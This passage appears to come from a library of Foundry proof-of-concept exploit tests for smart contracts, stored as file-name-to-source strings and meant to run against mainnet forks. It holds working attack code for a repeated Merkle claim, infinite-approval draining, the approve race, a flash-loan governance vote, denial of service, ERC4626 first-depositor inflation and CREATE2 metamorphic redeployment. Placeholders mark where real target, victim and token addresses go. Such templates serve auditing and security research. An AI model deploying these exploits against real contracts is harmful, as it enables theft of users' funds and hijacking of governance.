AMOUNT)\n        );\n        require(firstOk, \"first claim failed -- adapt the claim signature / proof / amount\");\n\n        // Same proof, same amount, second time.\n        vm.prank(attackerEOA);\n        (bool secondOk,) = target.call(\n            abi.encodeWithSignature(\"claim(bytes32[],uint256)\", proof, AMOUNT)\n        );\n        console.log(\"first claim ok:\", firstOk);\n        console.log(\"second claim (same proof) ok:\", secondOk);\n        assertTrue(secondOk, \"exploit did not reproduce: second claim was rejected (claimed check present)\");\n\n    }\n}\n",
  "37-approval-abuse.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Approval abuse (infinite approval + approve race)\n/// @notice (a) Infinite approval: a victim approved a spender for\n///         type(uint).max. The spender can drain the victim's ENTIRE\n///         balance at any time.\n///         (b) Approve race (ERC-20): victim approved 100, then submits a\n///             tx to change it to 50. The spender frontruns the change\n///             (spends 100), lets the change land, then spends 50 more --\n///             150 total from a 100 approval.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set TOKEN / VICTIM / SPENDER to\n///      real addresses on this fork (the victim's approval must exist\n///      on-chain for the PoC to run).\n\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: real token / victim / spender on this fork.\n    address public constant TOKEN = address(0);\n    address public constant VICTIM = address(0);\n    address public constant SPENDER = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_infiniteApprovalDrain() public {\n        require(TOKEN != address(0) && VICTIM != address(0) && SPENDER != address(0), \"set TOKEN / VICTIM / SPENDER\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n        uint256 allowance = IERC20(TOKEN).allowance(VICTIM, SPENDER);\n        uint256 victimBal = IERC20(TOKEN).balanceOf(VICTIM);\n        console.log(\"allowance:\", allowance);\n        console.log(\"victim balance:\", victimBal);\n        require(allowance >= victimBal, \"allowance does not cover the victim balance\");\n\n        vm.prank(SPENDER);\n        bool ok = IERC20(TOKEN).transferFrom(VICTIM, attackerEOA, victimBal);\n        require(ok, \"transferFrom failed\");\n        uint256 taken = IERC20(TOKEN).balanceOf(attackerEOA);\n        console.log(\"drained via infinite approval:\", taken);\n        assertEq(taken, victimBal, \"exploit did not reproduce: full balance not drained\");\n\n    }\n\n    function test_approveRace() public {\n        require(TOKEN != address(0) && VICTIM != address(0) && SPENDER != address(0), \"set TOKEN / VICTIM / SPENDER\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n\n        // Victim approved 100; spender frontruns the change to 50.\n        vm.prank(SPENDER);\n        bool ok1 = IERC20(TOKEN).transferFrom(VICTIM, attackerEOA, 100);\n        require(ok1, \"first transferFrom failed -- set a victim with >= 100 allowance\");\n\n        // Victim's change lands: approval is now 50.\n        vm.prank(VICTIM);\n        bool okApprove = IERC20(TOKEN).approve(SPENDER, 50);\n        require(okApprove, \"approve change failed\");\n\n        // Spender spends the \"new\" 50 too -- 150 total from a 100 approval.\n        vm.prank(SPENDER);\n        bool ok2 = IERC20(TOKEN).transferFrom(VICTIM, attackerEOA, 50);\n        require(ok2, \"second transferFrom failed\");\n        uint256 taken = IERC20(TOKEN).balanceOf(attackerEOA);\n        console.log(\"taken via approve race:\", taken);\n        assertEq(taken, 150, \"exploit did not reproduce: race did not yield 150\");\n\n    }\n}\n",
  "38-governance-flash-vote.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Governance flash-loan vote\n/// @notice A governance token's voting power is a snapshot / balance at\n///         vote time. An attacker flash-borrows a huge amount, delegates\n///         to themselves, casts the deciding vote, and repays -- all in ONE\n///         transaction. No economic stake, full governance control.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set POOL / GOV_TOKEN / GOVERNOR /\n///      PROPOSAL_ID to the real ones. Combines 35-flash-loan-generic with\n///      a governance vote in executeOperation().\n\ninterface IPool {\n    function flashLoanSimple(\n        address asset,\n        uint256 amount,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n}\n\ninterface IGovToken {\n    function delegate(address delegatee) external;\n    function getVotes(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address who) external view returns (uint256);\n}\n\ninterface IGovernor {\n    function castVote(uint256 proposalId, uint8 support) external returns (uint256);\n    function state(uint256 proposalId) external view returns (uint8);\n}\n\ncontract GovFlashAttacker {\n    IPool public immutable pool;\n    IGovToken public immutable govToken;\n    IGovernor public immutable governor;\n    uint256 public proposalId;\n\n    constructor(address pool_, address govToken_, address governor_) {\n        pool = IPool(pool_);\n        govToken = IGovToken(govToken_);\n        governor = IGovernor(governor_);\n    }\n\n    function attack(uint256 proposalId_, uint256 amount) external {\n        proposalId = proposalId_;\n        pool.flashLoanSimple(address(govToken), amount, bytes(\"\"), 0);\n    }\n\n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address,\n        bytes calldata\n    ) external returns (bool) {\n        // Flash-borrowed voting power, delegated to self, voted, repaid.\n        govToken.delegate(address(this));\n        governor.castVote(proposalId, 1); // 1 = for\n        uint256 repay = amount + premium;\n        govToken.approve(address(pool), repay);\n        asset; // silence unused warning\n        return true;\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: real pool / gov token / governor / proposal on this fork.\n    address public constant POOL = address(0);\n    address public constant GOV_TOKEN = address(0);\n    address public constant GOVERNOR = address(0);\n    uint256 public constant PROPOSAL_ID = 0;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(POOL != address(0) && GOV_TOKEN != address(0) && GOVERNOR != address(0), \"set POOL / GOV_TOKEN / GOVERNOR\");\n\n        GovFlashAttacker attacker = new GovFlashAttacker(POOL, GOV_TOKEN, GOVERNOR);\n        uint256 votesBefore = IGovToken(GOV_TOKEN).getVotes(address(attacker));\n        attacker.attack(PROPOSAL_ID, 100000 ether);\n        uint256 votesAfter = IGovToken(GOV_TOKEN).getVotes(address(attacker));\n        uint8 proposalState = IGovernor(GOVERNOR).state(PROPOSAL_ID);\n        console.log(\"attacker votes before:\", votesBefore);\n        console.log(\"attacker votes after flash vote:\", votesAfter);\n        console.log(\"proposal state:\", proposalState);\n        assertGt(votesAfter, votesBefore, \"exploit did not reproduce: flash-borrowed votes did not land\");\n\n    }\n}\n",
  "39-dos.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Denial of service (revert-in-loop + unbounded loop)\n/// @notice (a) Revert-in-loop: the target pays recipients in a LOOP\n///         (push payments). ONE recipient that reverts bricks the WHOLE\n///         distribution -- nobody gets paid.\n///         (b) Unbounded loop: the target iterates an array anyone can\n///             grow. Gas grows with the array until the function exceeds\n///             the block gas limit and can NEVER run again.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt distribute() / addRecipient()\n///      / push() / process() to the target's real functions.\n\ncontract Reverter {\n    receive() external payable {\n        revert(\"recipient always reverts\");\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_revertInLoopBricksDistribution() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n        Reverter reverter = new Reverter();\n\n        // TODO: adapt to the target's real recipient-adding function.\n        vm.prank(attackerEOA);\n        (bool addOk,) = target.call(\n            abi.encodeWithSignature(\"addRecipient(address)\", address(reverter))\n        );\n        require(addOk, \"addRecipient failed -- adapt to the target's recipient function\");\n\n        // TODO: adapt to the target's real distribution function.\n        (bool ok,) = target.call(abi.encodeWithSignature(\"distribute()\"));\n        console.log(\"distribute() ok with a reverting recipient:\", ok);\n        assertTrue(!ok, \"exploit did not reproduce: distribution survived the reverting recipient\");\n    }\n\n    function test_unboundedLoopGasGrowth() public {\n        // TODO: adapt push() / process() to the target's real functions.\n        // Grow the array in two steps and compare process() gas.\n        for (uint256 i = 0; i < 25; i++) {\n            (bool ok,) = target.call(abi.encodeWithSignature(\"push(uint256)\", i));\n            require(ok, \"push failed -- adapt to the target's array-growth function\");\n        }\n        uint256 gasBefore = gasleft();\n        (bool ok1,) = target.call(abi.encodeWithSignature(\"process()\"));\n        uint256 gas1 = gasBefore - gasleft();\n        require(ok1, \"process() failed at 25 entries\");\n\n        for (uint256 i = 25; i < 50; i++) {\n            (bool ok,) = target.call(abi.encodeWithSignature(\"push(uint256)\", i));\n            require(ok, \"push failed\");\n        }\n        gasBefore = gasleft();\n        (bool ok2,) = target.call(abi.encodeWithSignature(\"process()\"));\n        uint256 gas2 = gasBefore - gasleft();\n        require(ok2, \"process() failed at 50 entries\");\n\n        console.log(\"process() gas at 25 entries:\", gas1);\n        console.log(\"process() gas at 50 entries:\", gas2);\n        assertGt(gas2, gas1, \"exploit did not reproduce: process() gas does not grow with the array\");\n    }\n}\n",
  "40-erc4626-inflation.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- ERC4626 inflation / first-depositor attack\n/// @notice A vault prices shares as totalAssets / totalSupply. The first\n///         depositor deposits 1 wei (1 share), then DONATES a huge amount\n///         directly to the vault. Share price explodes, so the NEXT\n///         victim's deposit buys ~0 shares -- their funds are captured by\n///         the first depositor.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set ASSET / WHALE (a holder who can\n///      fund the attacker) / adapt deposit() to the vault's real ABI.\n\ninterface IVault {\n    function deposit(uint256 assets, address receiver) external returns (uint256 shares);\n    function previewDeposit(uint256 assets) external view returns (uint256 shares);\n    function asset() external view returns (address);\n}\n\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: an asset holder on this fork who can fund the attacker.\n    address public constant WHALE = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(WHALE != address(0), \"set WHALE to an asset holder on this fork\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n        address victimEOA = makeAddr(\"victim\");\n        address asset = IVault(target).asset();\n\n        // Fund both from a whale.\n        vm.prank(WHALE);\n        IERC20(asset).transfer(attackerEOA, 2000 ether);\n        vm.prank(WHALE);\n        IERC20(asset).transfer(victimEOA, 1000 ether);\n\n        // 1. Attacker deposits 1 wei -> 1 share (first depositor).\n        vm.prank(attackerEOA);\n        IERC20(asset).approve(target, 1);\n        vm.prank(attackerEOA);\n        IVault(target).deposit(1, attackerEOA);\n\n        // 2. Attacker DONATES 1000 ether directly -- share price explodes.\n        vm.prank(attackerEOA);\n        IERC20(asset).transfer(target, 1000 ether);\n\n        // 3. Victim deposits 1000 ether and gets ~0 shares.\n        uint256 victimShares = IVault(target).previewDeposit(1000 ether);\n        console.log(\"victim shares for 1000 ether deposit:\", victimShares);\n        assertLt(victimShares, 1000 ether / 100, \"exploit did not reproduce: victim got a fair share amount\");\n\n    }\n}\n",
  "41-create2-metamorphic.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- CREATE2 metamorphic redeploy (same address, new code)\n/// @notice A contract deployed via CREATE2 at a deterministic address can\n///         be REPLACED with different code at the SAME address -- IF it\n///         selfdestructs in the same transaction as its creation (post-\n///         Cancun / EIP-6780, selfdestruct only deletes code same-tx).\n///         Anyone trusting \"this address is that code\" is trusting a\n///         mutable binding.\n/// @dev FORK-ONLY (this PoC is self-contained -- it deploys its own factory\n///      on the fork and proves the metamorphic pattern). Run via\n///      scripts/run-fork-poc.sh. NOTE: the classic multi-tx metamorphic\n///      (deploy, later selfdestruct, redeploy) is DEAD post-Cancun; the\n///      same-tx factory path below is the live variant.\n\ncontract ImplV1 {\n    function version() external pure returns (uint256) {\n        return 1;\n    }\n\n    function kill() external {\n        selfdestruct(payable(msg.sender));\n    }\n}\n\ncontract ImplV2 {\n    function version() external pure returns (uint256) {\n        return 2;\n    }\n}\n\ncontract MetamorphicFactory {\n    // Deploys V1, selfdestructs it IN THE SAME TX (code deleted), then\n    // deploys V2 at the SAME CREATE2 address with different code.\n    function redeploy(bytes32 salt) external returns (address addr) {\n        bytes memory codeV1 = type(ImplV1).creationCode;\n        bytes memory codeV2 = type(ImplV2).creationCode;\n        assembly {\n            addr := create2(0, add(codeV1, 0x20), mload(codeV1), salt)\n        }\n        require(addr != address(0), \"V1 deploy failed\");\n        ImplV1(addr).kill();\n        assembly {\n            addr := create2(0, add(codeV2, 0x20), mload(codeV2), salt)\n        }\n        require(addr != address(0), \"V2 redeploy failed\");\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        MetamorphicFactory factory = new MetamorphicFactory();\n        bytes32 salt = bytes32(uint256(0xC0FFEE));\n\n        // Same-tx redeploy: V1 deployed + destroyed, V2 at the same address.\n        address addr = factory.redeploy(salt);\n        uint256 version = ImplV2(addr).version();\n        bytes32 codeHash;\n        assembly {\n            codeHash := extcodehash(addr)\n        }\n        console.log(\"redeployed address:\", addr);\n        console.log(\"code version at that address:\", version);\n        console.logBytes32(codeHash);\n        assertEq(version, 2, \"exploit did not reproduce: address does not hold V2 code\");\n    }\n}\n"
};

